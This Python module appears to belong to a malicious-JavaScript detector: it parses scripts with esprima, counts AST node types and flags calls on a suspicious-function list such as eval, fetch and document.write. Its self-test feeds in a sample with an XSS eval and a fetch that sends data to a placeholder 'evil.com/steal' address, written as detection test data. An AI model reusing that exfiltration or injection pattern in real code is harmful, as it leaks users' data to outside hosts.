"""
JavaScript AST (Abstract Syntax Tree) Extraction Module

Parses JavaScript code and extracts AST-based features.
"""

import esprima
from collections import Counter
from typing import Dict, List, Any


class ASTExtractor:
    """
    Extracts Abstract Syntax Tree features from JavaScript code.
    """
    
    # AST node types to track
    TRACKED_NODE_TYPES = {
        'FunctionDeclaration', 'FunctionExpression', 'ArrowFunctionExpression',
        'CallExpression', 'MemberExpression', 'Identifier', 'Literal',
        'IfStatement', 'ForStatement', 'WhileStatement', 'DoWhileStatement',
        'TryStatement', 'ThrowStatement', 'VariableDeclaration',
        'AssignmentExpression', 'BinaryExpression', 'UnaryExpression',
        'ObjectExpression', 'ArrayExpression', 'NewExpression',
        'ConditionalExpression', 'LogicalExpression', 'UpdateExpression'
    }
    
    # Suspicious function calls
    SUSPICIOUS_FUNCTIONS = {
        'eval', 'Function', 'setTimeout', 'setInterval', 'execScript',
        'document.write', 'document.writeln', 'innerHTML', 'outerHTML',
        'createElement', 'appendChild', 'insertBefore', 'replaceChild',
        'XMLHttpRequest', 'fetch', 'WebSocket', 'postMessage',
        'localStorage', 'sessionStorage', 'indexedDB', 'WebAssembly'
    }
    
    def __init__(self):
        """Initialize the AST extractor."""
        pass
    
    def extract(self, js_code: str) -> Dict[str, Any]:
        """
        Extract AST features from JavaScript code.
        
        Args:
            js_code: JavaScript code string
            
        Returns:
            Dictionary with AST features
        """
        try:
            # Parse JavaScript into AST
            ast = esprima.parseScript(js_code, {'tolerant': True, 'loc': True})
            
            # Initialize counters
            node_counts = Counter()
            identifiers = []
            literals = []
            function_calls = []
            
            # Traverse AST
            self._traverse(ast, node_counts, identifiers, literals, function_calls)
            
            # Calculate features
            features = {
                # Node type counts
                'total_nodes': sum(node_counts.values()),
                'function_count': (
                    node_counts.get('FunctionDeclaration', 0) +
                    node_counts.get('FunctionExpression', 0) +
                    node_counts.get('ArrowFunctionExpression', 0)
                ),
                'call_expression_count': node_counts.get('CallExpression', 0),
                'identifier_count': node_counts.get('Identifier', 0),
                'literal_count': node_counts.get('Literal', 0),
                'if_statement_count': node_counts.get('IfStatement', 0),
                'loop_count': (
                    node_counts.get('ForStatement', 0) +
                    node_counts.get('WhileStatement', 0) +
                    node_counts.get('DoWhileStatement', 0)
                ),
                'try_catch_count': node_counts.get('TryStatement', 0),
                'variable_declaration_count': node_counts.get('VariableDeclaration', 0),
                'assignment_count': node_counts.get('AssignmentExpression', 0),
                'binary_expression_count': node_counts.get('BinaryExpression', 0),
                'object_expression_count': node_counts.get('ObjectExpression', 0),
                'array_expression_count': node_counts.get('ArrayExpression', 0),
                'new_expression_count': node_counts.get('NewExpression', 0),
                
                # Function call analysis
                'unique_identifiers': len(set(identifiers)),
                'unique_function_calls': len(set(function_calls)),
                'suspicious_function_calls': self._count_suspicious_calls(function_calls),
                
                # Complexity metrics
                'ast_depth': self._calculate_depth(ast),
                'avg_identifier_length': self._avg_length(identifiers),
                
                # Detailed counts
                'node_type_counts': dict(node_counts),
                'all_function_calls': function_calls[:100],  # Limit to first 100
                
                # Success flag
                'parse_success': True,
                'parse_error': None
            }
            
            return features
            
        except Exception as e:
            # Return default features on parse error
            return {
                'total_nodes': 0,
                'function_count': 0,
                'call_expression_count': 0,
                'identifier_count': 0,
                'literal_count': 0,
                'if_statement_count': 0,
                'loop_count': 0,
                'try_catch_count': 0,
                'variable_declaration_count': 0,
                'assignment_count': 0,
                'binary_expression_count': 0,
                'object_expression_count': 0,
                'array_expression_count': 0,
                'new_expression_count': 0,
                'unique_identifiers': 0,
                'unique_function_calls': 0,
                'suspicious_function_calls': 0,
                'ast_depth': 0,
                'avg_identifier_length': 0,
                'node_type_counts': {},
                'all_function_calls': [],
                'parse_success': False,
                'parse_error': str(e)
            }
    
    def _traverse(self, node: Any, node_counts: Counter, 
                  identifiers: List[str], literals: List, 
                  function_calls: List[str]) -> None:
        """
        Recursively traverse AST and collect features.
        
        Args:
            node: Current AST node
            node_counts: Counter for node types
            identifiers: List to collect identifiers
            literals: List to collect literals
            function_calls: List to collect function calls
        """
        if node is None:
            return
        
        # Get node type
        node_type = node.type if hasattr(node, 'type') else None
        
        if node_type:
            # Count node type
            if node_type in self.TRACKED_NODE_TYPES:
                node_counts[node_type] += 1
            
            # Collect identifiers
            if node_type == 'Identifier' and hasattr(node, 'name'):
                identifiers.append(node.name)
            
            # Collect literals
            if node_type == 'Literal' and hasattr(node, 'value'):
                literals.append(node.value)
            
            # Collect function calls
            if node_type == 'CallExpression':
                call_name = self._get_call_name(node)
                if call_name:
                    function_calls.append(call_name)
        
        # Traverse child nodes
        if hasattr(node, '__dict__'):
            for key, value in node.__dict__.items():
                if isinstance(value, list):
                    for item in value:
                        self._traverse(item, node_counts, identifiers, literals, function_calls)
                elif hasattr(value, 'type'):
                    self._traverse(value, node_counts, identifiers, literals, function_calls)
    
    def _get_call_name(self, call_node: Any) -> str:
        """
        Extract function name from CallExpression node.
        
        Args:
            call_node: CallExpression AST node
            
        Returns:
            Function name string
        """
        if not hasattr(call_node, 'callee'):
            return ''
        
        callee = call_node.callee
        
        # Direct identifier: foo()
        if hasattr(callee, 'type') and callee.type == 'Identifier':
            return callee.name if hasattr(callee, 'name') else ''
        
        # Member expression: object.method()
        if hasattr(callee, 'type') and callee.type == 'MemberExpression':
            if hasattr(callee, 'property') and hasattr(callee.property, 'name'):
                return callee.property.name
        
        return ''
    
    def _count_suspicious_calls(self, function_calls: List[str]) -> int:
        """
        Count suspicious function calls.
        
        Args:
            function_calls: List of function call names
            
        Returns:
            Count of suspicious calls
        """
        count = 0
        for call in function_calls:
            if call in self.SUSPICIOUS_FUNCTIONS:
                count += 1
        return count
    
    def _calculate_depth(self, node: Any, current_depth: int = 0) -> int:
        """
        Calculate maximum depth of AST.
        
        Args:
            node: Current AST node
            current_depth: Current depth level
            
        Returns:
            Maximum depth
        """
        if node is None or not hasattr(node, '__dict__'):
            return current_depth
        
        max_depth = current_depth
        
        for key, value in node.__dict__.items():
            if isinstance(value, list):
                for item in value:
                    depth = self._calculate_depth(item, current_depth + 1)
                    max_depth = max(max_depth, depth)
            elif hasattr(value, 'type'):
                depth = self._calculate_depth(value, current_depth + 1)
                max_depth = max(max_depth, depth)
        
        return max_depth
    
    def _avg_length(self, strings: List[str]) -> float:
        """
        Calculate average string length.
        
        Args:
            strings: List of strings
            
        Returns:
            Average length
        """
        if not strings:
            return 0.0
        return sum(len(s) for s in strings) / len(strings)


if __name__ == "__main__":
    # Test the AST extractor
    extractor = ASTExtractor()
    
    test_code = """
    function maliciousCode() {
        eval("alert('XSS')");
        var x = setTimeout(function() {
            document.write("<script>...</script>");
        }, 1000);
        
        for (var i = 0; i < 10; i++) {
            fetch("http://evil.com/steal?data=" + i);
        }
    }
    
    var crypto = new WebAssembly.Instance();
    localStorage.setItem("key", "value");
    """
    
    features = extractor.extract(test_code)
    
    print("AST Extraction Test:")
    print(f"  Parse success: {features['parse_success']}")
    print(f"  Total nodes: {features['total_nodes']}")
    print(f"  Functions: {features['function_count']}")
    print(f"  Function calls: {features['call_expression_count']}")
    print(f"  Suspicious calls: {features['suspicious_function_calls']}")
    print(f"  Loops: {features['loop_count']}")
    print(f"  AST depth: {features['ast_depth']}")
    print(f"  Unique identifiers: {features['unique_identifiers']}")
    print(f"\nFunction calls detected: {features['all_function_calls']}")
